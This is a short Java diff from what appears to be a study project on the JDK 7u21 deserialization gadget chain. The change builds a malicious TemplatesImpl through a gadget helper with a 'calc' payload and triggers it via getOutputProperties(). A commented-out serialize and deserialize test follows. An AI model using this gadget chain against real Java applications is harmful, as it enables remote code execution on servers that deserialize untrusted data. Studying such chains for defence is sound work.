@@ -35,10 +35,14 @@ public class jdk7u21 {
 
         return set;
     }
+
     public static void main(String[] args) throws Exception {
+        final TemplatesImpl templates = new TemplatesImpl();
 
         TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl("calc");
         calc.getOutputProperties();
+    }
+//        public static void main(String[] args) throws Exception {
 //            Object calc = getObject("calc");
 //
 //            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
@@ -54,6 +58,6 @@ public class jdk7u21 {
 //
 //            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
 //            Object o = objectInputStream.readObject();
-
-    }
+//
+//    }
 }
